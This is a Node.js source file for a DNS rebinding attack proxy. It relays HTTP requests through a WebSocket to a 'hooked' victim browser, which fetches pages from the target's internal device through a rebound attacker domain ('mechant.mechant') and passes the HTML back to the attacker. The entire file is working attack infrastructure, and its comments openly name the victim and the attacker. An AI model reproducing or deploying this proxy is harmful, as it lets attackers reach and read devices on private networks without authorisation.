const WebSocket = require('ws')
const fetch = require('node-fetch');
const mime = require('mime')
const express = require('express');


// Where the Proxy is serving the hacked data
const HTTP_PORT = 1337

const WS_PORT = 4242
const wss = new WebSocket.Server({ port: WS_PORT })

// Not sure if this thing does anything
express.static.mime.charsets.lookup=function(){}


/**************************** UTILS ****************************************/

wss.broadcast = function broadcast(msg)
{
   console.log("broadcasting: " , msg);

   if (wss.clients.length == 0) return;

   wss.clients.forEach(function each(client) {
       client.send(JSON.stringify(msg));
    });
};

// Helper function to wait for proper answer
function wait(n) { return new Promise(resolve => setTimeout(resolve, n)); }

/**************************** END UTILS *************************************/

var app = express();

// Requests is meant to hold hanging requests
var requests = {}
var index = -1

wss.on('connection', ws => {

    console.log("Web Socket connected")

  ws.on('message', message => {

	    // console.log(`Received message => ${message}`)

	    try
	    {
		    message = JSON.parse(message)
	    }
	    catch (error)
	    {
	    	console.error("Websocket on message error:", error)
	    	return
	    }

	    if (message.type == 'redirect')
	    {
	    	requests[message.index] = message
	    }

  	})
})

// Hack to get around the asynchronoussness of the communication
// TODO: Find a proper way
function try_to_send(res, redirect_request, retry)
{
	if (retry < 0)
	{
		res.status(404).send("Not Found")
		return;
	}

	var html = ''
	if (redirect_request.index in requests)
	{
		html = requests[redirect_request.index].html
		delete requests[redirect_request.index]

	    res.send(html)
	}
	else
	{
		// Retry after 500 milliseconds (I know ...)
		wait(500).then( () => {

			try_to_send(res, redirect_request, retry - 1);

		}).catch( (err) => console.log("Error in try_to_send wait function: ", err))

	}
}

/****************************************************************************/
/****************************************************************************/
/**************************** HTTP SIDE *************************************/
/****************************************************************************/
/****************************************************************************/


// Redirect all get request to the victim's browser which itself redirects to
// the target's device
app.get('/*', function(req, res)
{
	// Attacker's domain which has been rebound
	var HOST = "mechant.mechant:3000"

    index++;

    // Creating request object
	var redirect_request = {}
	redirect_request.type = "redirect"
	redirect_request.url = "http://" + HOST + req.url
	redirect_request.index = index

	// Forwarding request to the hooked browser
	wss.broadcast(redirect_request)

    // Setting response headers
	res.header("Access-Control-Allow-Origin", "*");
 	res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");

	// TODO: find a better way to set content type    
    var spliter = req.url.split(".")
    var last = spliter[spliter.length - 1]

    // Let express set default content type for non recognized type
    if (last != "/")
    {
	    res.setHeader("Content-Type", mime.lookup(redirect_request.url));
    }

    // Check if the response is ready
	try_to_send(res, redirect_request, /* Number of tries */ 10)

});

app.listen(HTTP_PORT, function ()
{
  console.log('Proxy DNS Rebinding server listening on port ' + HTTP_PORT + " !")

})

